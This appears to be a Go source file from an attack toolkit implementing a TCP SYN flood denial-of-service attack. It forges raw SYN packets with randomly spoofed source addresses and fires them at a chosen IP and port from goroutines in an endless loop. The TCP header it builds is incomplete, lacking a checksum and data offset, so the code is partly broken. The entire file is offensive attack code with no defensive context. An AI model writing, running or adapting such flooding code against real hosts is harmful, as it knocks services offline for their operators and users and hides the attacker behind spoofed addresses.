package services

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"

	"golang.org/x/net/ipv4"
)

func randomIP() net.IP {
	return net.IPv4(byte(rand.Intn(254)+1), byte(rand.Intn(254)+1), byte(rand.Intn(254)+1), byte(rand.Intn(254)+1))
}

func createTCPSYN(srcIP net.IP, dstIP net.IP, srcPort int, dstPort int) []byte {
	packet := make([]byte, 20)

	packet[0], packet[1] = byte(srcPort>>8), byte(srcPort&0xff)
	packet[2], packet[3] = byte(dstPort>>8), byte(dstPort&0xff)

	packet[13] = 2
	packet[14], packet[15] = 0xff, 0xff

	return packet
}

func sendSYNPacket(rawConn *ipv4.RawConn, dstIP net.IP, dstPort int, wg *sync.WaitGroup, verbose *bool) {
	defer wg.Done()

	srcIP := randomIP()
	srcPort := rand.Intn(65535-1024) + 1024

	ipHeader := &ipv4.Header{
		Version:  4,
		Len:      20,
		TotalLen: 40,
		TTL:      64,
		Protocol: 6, // TCP
		Src:      srcIP,
		Dst:      dstIP,
	}

	tcpSYN := createTCPSYN(srcIP, dstIP, srcPort, dstPort)

	err := rawConn.WriteTo(ipHeader, tcpSYN, nil)
	if err != nil {
		log.Println("Error:", err)
		return
	}

	if *verbose {
		currentTime := time.Now()
		fmt.Printf("[%s] - SYN Flood - Package sent from %s:%d to %s:%d\n", currentTime.Format("2006-01-02 15:04:05"), srcIP, srcPort, dstIP, dstPort)
	}

}

func SynFlood(ip *string, port *int, numRoutines *int, verbose *bool) {

	dstIP := net.ParseIP(*ip)
	dstPort := *port

	conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	rawConn, err := ipv4.NewRawConn(conn)
	if err != nil {
		log.Fatal(err)
	}

	if !*verbose {
		fmt.Println("TCP Flood DoS has been initialized.")
	}

	var wg sync.WaitGroup

	for {
		for i := 0; i < *numRoutines; i++ {
			wg.Add(1)
			go sendSYNPacket(rawConn, dstIP, dstPort, &wg, verbose)
			time.Sleep(10 * time.Millisecond)
		}
	}
}
